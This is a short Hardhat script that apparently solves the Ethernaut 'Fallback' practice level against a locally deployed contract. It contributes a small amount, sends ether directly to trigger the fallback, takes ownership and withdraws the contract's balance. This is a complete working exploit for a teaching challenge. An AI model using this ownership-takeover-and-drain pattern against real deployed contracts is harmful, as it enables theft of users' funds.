import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x5fbdb2315678afecb367f032d93f642f64180aa3";
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallback",
    CONTRACT_ADDRESS,
    signer
  );

  console.log("Fallback Address: ", contract.address);

  let owner = await contract.owner();
  console.log("Owner: ", owner);

  console.log(`Amount Before attack: ${await contract.getContribution()}`);

  await contract.contribute({
    value: ethers.utils.parseEther("0.0001"),
  });

  // This should trigger the fallback function
  await signer.sendTransaction({
    to: contract.address,
    value: ethers.utils.parseEther("0.0001"),
  });

  console.log(`Amount after attack: ${await contract.getContribution()}`);
  owner = await contract.owner();
  console.log(`New Owner: ${owner}`);
  await contract.withdraw();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
